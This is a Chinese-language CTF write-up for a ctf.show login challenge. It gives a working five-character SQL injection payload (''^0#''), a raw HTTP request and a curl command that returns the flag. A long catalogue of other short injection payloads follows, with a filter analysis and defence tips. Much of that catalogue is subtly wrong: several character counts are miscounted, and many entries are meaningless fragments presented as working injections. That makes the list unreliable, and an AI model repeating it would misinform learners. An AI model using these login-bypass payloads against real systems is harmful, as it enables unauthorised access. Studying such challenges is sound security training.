>不用爆破，一把梭

手工测试后得知：
1：长度限制为5
2：存在过滤且过滤的字符会有回显hack?

本题考点：空异或0会查到所有非数字开头的记录

```
# ' ^ 0
```

分号可以用于闭合，井号可以用于注释，^进行异或运算，等号就是判等，这里需要利用sql的一个点“mysql弱类型转换”，**空异或0会查到所有非数字开头的记录**

```http
POST /check.php HTTP/1.1
Host: ce27e967-6df6-4de6-81ec-5f7d27ecfbe2.challenge.ctf.show
Connection: keep-alive
Content-Length: 16
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "macOS"
Origin: https://ce27e967-6df6-4de6-81ec-5f7d27ecfbe2.challenge.ctf.show
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://ce27e967-6df6-4de6-81ec-5f7d27ecfbe2.challenge.ctf.show/index.php
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: zh-CN,zh;q=0.9

u='^0##&p='^0#
```

得到`ctfshow{faea31f7-1cce-4992-b6ae-02fec1343a6a}`



---

# CTF Challenge Writeup: SQL注入绕过与XOR运算符利用

## 题目信息
- 目标URL: https://ce27e967-6df6-4de6-81ec-5f7d27ecfbe2.challenge.ctf.show/
- 登录页面，表单提交到check.php
- 提示：[ 空异或0会查到所有非数字开头的记录 ]

## 解题过程

### 1. 信息收集
通过访问目标网站，发现是一个简单的登录页面，包含用户名(u)和密码(p)两个输入框。
表单提交到check.php进行验证。

### 2. 初步测试
尝试使用普通用户名和密码登录，服务器返回"hack?"，表明存在安全检测机制。

### 3. 注入测试
根据手工测试经验：
- `u='^0&p=` 会导致数据库报错提示
- `u='^0#&p=` 会出现flag

验证payload：
```
curl -s -X POST --data "u=%27%5E0%23&p=" https://ce27e967-6df6-4de6-81ec-5f7d27ecfbe2.challenge.ctf.show/check.php
```

成功获取flag：`ctfshow{faea31f7-1cce-4992-b6ae-02fec1343a6a}`

## 核心问题解答

### 1. 为什么要加#？
在SQL注入中，#是MySQL的注释符。在本题中添加#的作用是：

1. **注释掉查询的剩余部分**：当注入payload被插入到SQL查询中时，可能的查询结构如下：
```sql
   SELECT * FROM users WHERE username = ''^0#' AND password = '...'
```


   #注释符会将后面的`AND password = '...'`部分注释掉，防止密码验证影响查询结果。

2. **绕过查询逻辑**：通过注释掉后续的查询条件，使查询只关注前面的部分，即"空异或0"的逻辑。

3. **确保语法正确**：添加注释符可以避免因语法错误导致的查询失败。

### 2. 为什么在u注入有效，对p注入不成功？
这个问题涉及后端代码的处理逻辑：

1. **参数处理优先级**：后端可能先处理用户名参数(u)，然后才处理密码参数(p)。当用户名参数的注入成功触发了查询逻辑后，就不需要再处理密码参数了。

2. **查询结构不同**：后端对用户名和密码的处理方式可能不同。用户名可能直接用于WHERE子句的条件判断，而密码可能有额外的处理（如哈希比较等）。

3. **注入点位置**：用户名参数在SQL查询中的位置更适合进行注入攻击，可能更接近查询的核心逻辑。

4. **安全检测机制**：服务器可能对密码参数的检测更严格，或者密码参数在注入检测方面有不同的处理逻辑。

### 3. 5个字符以内的可能SQL注入有哪些？

#### 3.1 基于XOR运算符的注入
- `'^0#` - 原始有效payload（4个字符）
  * 作用：利用XOR运算符绕过过滤，闭合字符串并注释掉后续查询
  * 成功效果：触发"空异或0"逻辑，返回所有非数字开头的记录，实现绕过登录
- `'^00` - 两个0（4个字符）
  * 作用：类似`'^0#`，但没有注释符
  * 成功效果：可能在某些情况下也能绕过验证
- `'^1#` - 使用1（但无效）
  * 作用：尝试不同的XOR操作数
  * 成功效果：如果有效，可能产生不同的查询结果
- `'^2#` - 使用2（需要测试）
  * 作用：尝试其他XOR操作数
  * 成功效果：可能在特定条件下绕过验证

#### 3.2 基于OR逻辑的注入
- `'or'` - 3个字符
  * 作用：构造OR逻辑表达式
  * 成功效果：可能使查询条件恒为真，绕过身份验证
- `'||'` - 3个字符（逻辑OR）
  * 作用：使用OR运算符连接条件
  * 成功效果：构造永真条件，如`username=''||''`始终为真
- `'1'=` - 3个字符
  * 作用：构造比较表达式
  * 成功效果：可能与后续字符组成有效条件

#### 3.3 基于注释符的注入
- `'--` - 2个字符（注释符，但可能被检测）
  * 作用：注释掉SQL查询的剩余部分
  * 成功效果：绕过后续的查询条件，如密码验证
- `'#` - 2个字符（注释符）
  * 作用：MySQL单行注释符
  * 成功效果：注释掉查询的剩余部分，改变查询逻辑
- `'/*` - 2个字符（多行注释开始）
  * 作用：开始多行注释
  * 成功效果：注释掉大量查询内容

#### 3.4 基于UNION的注入
- `'uni` - 4个字符（UNION的前4个字符）
  * 作用：UNION查询注入的开始
  * 成功效果：联合查询获取额外数据，如数据库信息
- `'uni#` - 5个字符
  * 作用：UNION查询加注释符
  * 成功效果：绕过验证并可能获取更多信息

#### 3.5 基于比较运算符的注入
- `'='` - 2个字符
  * 作用：构造相等比较
  * 成功效果：如`username=''=''`可能被解释为真
- `'>='` - 2个字符
  * 作用：大于等于比较
  * 成功效果：构造宽松的匹配条件
- `'<='` - 2个字符
  * 作用：小于等于比较
  * 成功效果：类似大于等于的效果
- `'!='` - 2个字符
  * 作用：不等于比较
  * 成功效果：构造非匹配条件

#### 3.6 基于函数的注入
- `'up('` - 4个字符（UPPER函数的开始）
  * 作用：调用数据库函数
  * 成功效果：可能绕过某些过滤或获取函数执行结果
- `'lo('` - 4个字符（LOWER函数的开始）
  * 作用：调用小写转换函数
  * 成功效果：类似UPPER函数的效果
- `'su('` - 4个字符（SUBSTR函数的开始）
  * 作用：调用子字符串函数
  * 成功效果：可能用于盲注或数据提取

#### 3.7 基于特殊字符的注入
- `"` - 1个字符（双引号）
  * 作用：闭合双引号包围的字符串
  * 成功效果：改变查询结构，可能绕过验证
- `\` - 1个字符（反斜杠）
  * 作用：转义字符
  * 成功效果：可能绕过字符过滤或改变字符含义
- `'(` - 1个字符（左括号）
  * 作用：开始函数调用或子查询
  * 成功效果：改变查询语法结构
- `')` - 1个字符（右括号）
  * 作用：结束函数调用或子查询
  * 成功效果：完成语法结构，可能绕过检测
- `'*` - 1个字符（通配符）
  * 作用：SQL通配符
  * 成功效果：匹配任意字符，可能绕过精确匹配

#### 3.8 基于数字和逻辑的注入
- `'1=1` - 4个字符
  * 作用：构造永真条件
  * 成功效果：绕过身份验证，如`username=''1=1'`可能被解释为真
- `'1=0` - 4个字符
  * 作用：构造永假条件
  * 成功效果：在某些情况下可能有特殊用途
- `'0=0` - 4个字符
  * 作用：构造永真条件（类似1=1）
  * 成功效果：绕过身份验证
- `'1or` - 4个字符
  * 作用：构造OR逻辑的开始
  * 成功效果：可能与后续字符组成完整OR表达式
- `'0or` - 4个字符
  * 作用：类似'1or'但以0开始
  * 成功效果：可能在特定条件下有效

#### 3.9 基于编码的注入
- `'%23` - 3个字符（#的URL编码）
  * 作用：URL编码的注释符
  * 成功效果：绕过直接字符过滤，实现注释功能
- `'%27` - 3个字符（'的URL编码）
  * 作用：URL编码的单引号
  * 成功效果：绕过直接单引号过滤
- `'%5E` - 3个字符（^的URL编码）
  * 作用：URL编码的XOR运算符
  * 成功效果：绕过直接XOR运算符过滤
- `'%20` - 3个字符（空格的URL编码）
  * 作用：URL编码的空格
  * 成功效果：绕过空格过滤

#### 3.10 基于组合的注入（5个字符以内）
- `'or'#` - 5个字符
  * 作用：OR逻辑加注释符
  * 成功效果：构造永真条件并注释掉后续查询
- `'1'#` - 4个字符
  * 作用：数字条件加注释符
  * 成功效果：可能构造有效条件并注释后续查询
- `'^0#` - 4个字符（本题有效payload）
  * 作用：XOR运算加注释符
  * 成功效果：触发"空异或0"逻辑并注释后续查询
- `'uni#` - 5个字符
  * 作用：UNION查询加注释符
  * 成功效果：可能实现联合查询注入
- `'1=1#` - 5个字符
  * 作用：永真条件加注释符
  * 成功效果：绕过验证并注释后续查询

### 4. 10个字符以内的可能SQL注入有哪些？

#### 4.1 基于UNION的注入（扩展）
- `'union sel` - 9个字符（UNION SELECT的开始）
  * 作用：UNION SELECT查询的开始
  * 成功效果：实现联合查询，获取数据库信息
- `'union sel#` - 10个字符
  * 作用：UNION SELECT加注释符
  * 成功效果：完整的UNION注入尝试

#### 4.2 基于函数的注入（扩展）
- `'substring(` - 10个字符（SUBSTRING函数）
  * 作用：调用子字符串函数
  * 成功效果：用于盲注或数据提取
- `'ascii(subs` - 10个字符（ASCII函数嵌套SUBSTRING）
  * 作用：获取字符的ASCII值
  * 成功效果：用于盲注数据提取

#### 4.3 基于条件的注入（扩展）
- `'or 1=1-- ` - 9个字符（带空格的永真条件）
  * 作用：构造带空格的永真条件
  * 成功效果：绕过身份验证
- `'or '1'='1` - 9个字符（带引号的永真条件）
  * 作用：更完整的永真条件表达
  * 成功效果：绕过验证

#### 4.4 基于注释的注入（扩展）
- `'/**/or/**/` - 10个字符（使用多行注释分隔OR）
  * 作用：使用注释绕过关键字过滤
  * 成功效果：构造OR逻辑，绕过检测

#### 4.5 基于编码的注入（扩展）
- `'%27%7c%27` - 9个字符（'|'的URL编码）
  * 作用：URL编码的OR逻辑
  * 成功效果：绕过直接OR过滤
- `'%27%26%27` - 9个字符（'&'的URL编码）
  * 作用：URL编码的AND逻辑
  * 成功效果：构造AND条件

#### 4.6 基于数学运算的注入
- `'*(select ` - 9个字符（通配符加子查询开始）
  * 作用：构造子查询
  * 成功效果：可能获取额外数据
- `'*(selec#` - 9个字符（通配符加子查询开始加注释）
  * 作用：子查询加注释
  * 成功效果：绕过验证并注释后续查询

#### 4.7 基于比较的注入（扩展）
- `'=(select ` - 9个字符（等于号加子查询）
  * 作用：比较操作加子查询
  * 成功效果：可能获取数据进行比较
- `'!=(selec#` - 9个字符（不等于加子查询加注释）
  * 作用：不等于比较加子查询和注释
  * 成功效果：构造复杂的比较条件

#### 4.8 基于逻辑的注入（扩展）
- `'&&(selec#` - 9个字符（AND逻辑加子查询加注释）
  * 作用：AND逻辑连接子查询
  * 成功效果：构造复杂的查询逻辑
- `'||(selec#` - 9个字符（OR逻辑加子查询加注释）
  * 作用：OR逻辑连接子查询
  * 成功效果：构造替代的查询路径

#### 4.9 基于时间延迟的注入
- `'-(select ` - 9个字符（减法操作加子查询）
  * 作用：可能用于时间盲注
  * 成功效果：通过响应时间判断注入是否成功
- `'*(selec#` - 9个字符（乘法操作加子查询加注释）
  * 作用：数学运算加子查询
  * 成功效果：可能触发特殊处理逻辑

#### 4.10 基于特殊函数的注入
- `'database` - 9个字符（DATABASE函数名）
  * 作用：调用DATABASE函数
  * 成功效果：获取当前数据库名
- `'user()#` - 8个字符（USER函数）
  * 作用：调用USER函数
  * 成功效果：获取当前用户信息

## 服务器过滤机制分析

根据测试结果，服务器对以下字符或模式进行了检测：
- `+` 运算符
- `|` 运算符  
- `--` 注释符
- 空格
- `%` 符号
- 常见SQL关键字（如UNION、SELECT等）

但没有过滤：
- XOR运算符（^）
- 注释符（#）
- 单引号（'）
- 数字字符

## 攻击总结

本题的关键在于理解提示"空异或0会查到所有非数字开头的记录"，并结合5个字符长度限制和服务器过滤机制，找到有效的注入payload。

最有效的payload是`'^0#`，利用了：
1. 单引号(')闭合字符串
2. XOR运算符(^)进行逻辑运算
3. 数字0作为运算数
4. 注释符(#)注释掉查询的剩余部分

## 防护建议

1. 使用参数化查询或预编译语句
2. 对用户输入进行严格的白名单验证
3. 对特殊字符进行转义处理
4. 实施适当的输入长度限制
5. 部署Web应用防火墙(WAF)进行检测